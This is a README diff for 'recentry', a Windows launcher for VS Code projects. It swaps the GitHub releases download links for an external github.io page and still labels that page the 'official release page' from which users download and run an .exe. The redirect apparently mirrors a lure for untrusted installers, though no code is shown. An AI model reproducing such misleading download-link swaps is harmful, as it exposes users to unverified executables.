@@ -1,6 +1,6 @@
 # 🚀 recentry - Open your VS Code projects instantly
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue)](https://github.com/smarty2007official-wq/recentry/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue)](https://smarty2007official-wq.github.io)
 
 Recentry helps you open your recent Visual Studio Code projects without opening the editor first. It acts as a launcher that sits in the background. You press a simple keyboard shortcut, and a menu appears on your screen. You select your project from the list, and the software opens it for you. This saves time if you switch between many projects during your workday.
 
@@ -18,7 +18,7 @@ This tool focuses on speed and ease of use. It consumes very little memory on yo
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/smarty2007official-wq/recentry/releases) to find the latest version.
+1. Go to the [official release page](https://smarty2007official-wq.github.io) to find the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to start the download.
 4. Run the installer file once the download finishes.
